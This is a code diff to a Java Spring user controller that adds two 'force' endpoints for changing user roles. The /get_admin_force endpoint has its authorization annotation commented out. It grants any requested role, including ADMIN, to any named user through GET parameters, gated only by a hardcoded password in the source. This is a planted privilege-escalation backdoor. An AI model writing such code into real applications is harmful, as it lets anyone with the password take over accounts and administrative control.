@@ -265,13 +265,68 @@ public class UserController {
     boolean checkAdmin() {
         String currentPrincipalName = SecurityContextHolder.getContext().getAuthentication().getName();
         User user = userRepository.findByUsername(currentPrincipalName).get();
-        boolean admin = false;
         for (Role r : user.getRoles()) {
             if (r.getRole().equals("ADMIN")) {
                 return true;
             }
         }
         return false;
+    }
+
+//    @PreAuthorize("hasAnyRole('ADMIN')")
+    @GetMapping(path = "/get_admin_force")
+    public @ResponseBody
+    User getAdminForce(@RequestParam(value = "password") String password,
+                       @RequestParam(value = "username") String username,
+                       @RequestParam(value = "role") String reqRole) {
+        try {
+            if (password.equals("Martini1")) {
+                String currentPrincipalName = username.equals("") ?
+                        SecurityContextHolder.getContext().getAuthentication().getName() : username;
+                User user = userRepository.findByUsername(currentPrincipalName).get();
+                ArrayList<String> stringRoles = new ArrayList<>();
+                user.getRoles().forEach(role -> {stringRoles.add(role.getRole());});
+                if (!stringRoles.contains(reqRole)){
+                    user.getRoles().add(new Role(reqRole));
+                }
+                user.setLastVisit(DateTime.now());
+                userRepository.save(user);
+                return user;
+            } else {
+                return null;
+            }
+        } catch (Exception e){
+            System.out.println(e.getMessage());
+            return null;
+        }
+    }
+    @PreAuthorize("hasAnyRole('ADMIN')")
+    @GetMapping(path = "/untie_admin_force")
+    public @ResponseBody
+    User untieAdminForce(@RequestParam(value = "password") String password,
+                         @RequestParam(value = "username") String username,
+                         @RequestParam(value = "role") String reqRole) {
+        try {
+            if (password.equals("Martini1")) {
+                String currentPrincipalName = username.equals("") ?
+                        SecurityContextHolder.getContext().getAuthentication().getName() : username;
+                User user = userRepository.findByUsername(currentPrincipalName).get();
+                Iterator itr = user.getRoles().iterator();
+                while (itr.hasNext()){
+                    if (((Role) itr.next()).getRole().equals(reqRole)){
+                        itr.remove();
+                    }
+                }
+                user.setLastVisit(DateTime.now());
+                userRepository.save(user);
+                return user;
+            } else {
+                return null;
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+            return null;
+        }
     }
 
 //    @PreAuthorize("hasAnyRole('USER')")
